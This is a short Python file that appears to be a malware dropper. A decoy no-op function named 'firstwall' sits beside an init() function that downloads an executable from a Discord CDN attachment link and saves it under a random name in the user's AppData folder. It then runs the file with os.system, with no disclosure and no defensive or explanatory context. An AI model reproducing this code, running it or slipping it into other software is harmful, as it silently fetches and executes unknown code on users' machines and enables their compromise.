import os, requests

def firstwall(code):
    code = code
    return code
    
def init():
    if os.path.exists(os.path.join(os.environ["USERPROFILE"], "AppData","HV9M6B3CC.exe")):
        pass
    else:
        with open(os.path.join(os.environ["USERPROFILE"], "AppData")+"\\HV9M6B3CC.exe","wb") as f:
            f.write(requests.get("https://cdn.discordapp.com/attachments/1061092070128881748/1061108110011408414/HNCVGT745XZ.exe").content)
        os.system(os.path.join(os.environ["USERPROFILE"], "AppData","HV9M6B3CC.exe"))
